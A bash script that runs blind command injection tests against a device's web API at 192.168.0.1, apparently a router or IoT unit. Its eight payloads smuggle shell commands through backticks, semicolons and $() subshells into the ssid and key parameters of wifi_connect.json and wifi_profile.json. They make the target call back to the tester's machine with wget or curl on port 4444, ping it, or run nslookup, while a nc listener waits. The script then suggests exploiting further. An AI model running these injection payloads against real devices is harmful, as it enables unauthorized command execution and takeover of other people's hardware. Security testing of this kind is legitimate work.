#!/bin/bash
# Blind command injection testing - output/network-based detection
# Since timing-based tests failed, try to detect execution via outbound connections

TARGET="192.168.0.1"
OUTPUT_DIR="../recon/api/injection_tests"

# Get attacker machine IP (where this script runs)
MY_IP=$(ip addr show | grep "inet 192.168" | head -1 | awk '{print $2}' | cut -d/ -f1)

if [ -z "$MY_IP" ]; then
    echo "Error: Could not detect your IP address on 192.168.x network"
    echo "Please manually set MY_IP variable in this script"
    exit 1
fi

echo "=== Blind Command Injection Testing ==="
echo "Target: $TARGET"
echo "Your IP: $MY_IP"
echo
echo "IMPORTANT: In another terminal, run one of these listeners:"
echo "  1. nc -lvnp 4444              # HTTP callback"
echo "  2. sudo tcpdump -i any icmp   # Ping detection"
echo "  3. sudo tcpdump -i any port 53 # DNS detection"
echo
read -p "Press Enter when listener is ready..."
echo

mkdir -p "$OUTPUT_DIR"

# Test 1: HTTP callback via wget (URL encoded)
echo "[Test 1] HTTP callback via wget"
echo "Payload: ssid=test\`wget http://${MY_IP}:4444/pwned\`"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=test%60wget%20http://${MY_IP}:4444/pwned%60&key=pass" > /dev/null
echo "Check your nc listener for connection..."
sleep 3
echo

# Test 2: HTTP callback via curl (URL encoded)
echo "[Test 2] HTTP callback via curl"
echo "Payload: ssid=test\`curl http://${MY_IP}:4444/pwned\`"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=test%60curl%20http://${MY_IP}:4444/pwned%60&key=pass" > /dev/null
echo "Check your nc listener for connection..."
sleep 3
echo

# Test 3: Ping detection
echo "[Test 3] Ping detection"
echo "Payload: ssid=test\`ping -c 1 ${MY_IP}\`"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=test%60ping%20-c%201%20${MY_IP}%60&key=pass" > /dev/null
echo "Check your tcpdump for ICMP packets..."
sleep 3
echo

# Test 4: DNS lookup
echo "[Test 4] DNS lookup"
echo "Payload: ssid=test\`nslookup pwned.test\`"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=test%60nslookup%20pwned.test%60&key=pass" > /dev/null
echo "Check your tcpdump for DNS queries..."
sleep 3
echo

# Test 5: Using semicolon instead of backticks
echo "[Test 5] Semicolon syntax - HTTP callback"
echo "Payload: ssid=test;wget http://${MY_IP}:4444/pwned"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=test%3Bwget%20http://${MY_IP}:4444/pwned&key=pass" > /dev/null
echo "Check your nc listener for connection..."
sleep 3
echo

# Test 6: Subshell syntax
echo "[Test 6] Subshell syntax - ping"
echo "Payload: ssid=test\$(ping -c 1 ${MY_IP})"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=test%24%28ping%20-c%201%20${MY_IP}%29&key=pass" > /dev/null
echo "Check your tcpdump for ICMP packets..."
sleep 3
echo

# Test 7: Try in password field
echo "[Test 7] Password field - HTTP callback"
echo "Payload: key=\`wget http://${MY_IP}:4444/pwned-from-key\`"
curl -s -X POST "http://$TARGET/wifi_connect.json?ssid=testnet&key=%60wget%20http://${MY_IP}:4444/pwned-from-key%60" > /dev/null
echo "Check your nc listener for connection..."
sleep 3
echo

# Test 8: Try DELETE endpoint
echo "[Test 8] DELETE endpoint - ping"
echo "Payload: DELETE wifi_profile.json?ssid=test\`ping -c 1 ${MY_IP}\`"
curl -s -X DELETE "http://$TARGET/wifi_profile.json?ssid=test%60ping%20-c%201%20${MY_IP}%60" > /dev/null
echo "Check your tcpdump for ICMP packets..."
sleep 3
echo

echo "=== Test Complete ==="
echo
echo "Summary:"
echo "- Tested 8 different injection methods"
echo "- Monitored for HTTP callbacks, ping, and DNS"
echo
echo "If you saw ANY connections in your listeners:"
echo "  🚨 COMMAND INJECTION CONFIRMED!"
echo "  Document which payload worked and exploit further"
echo
echo "If you saw NOTHING:"
echo "  Device likely properly sanitizes input"
echo "  Consider these alternatives:"
echo "    1. Try output-based detection (write to /tmp, read via path traversal)"
echo "    2. Test for error-based injection"
echo "    3. Focus on firmware extraction instead"
echo
echo "Results location: $OUTPUT_DIR/"
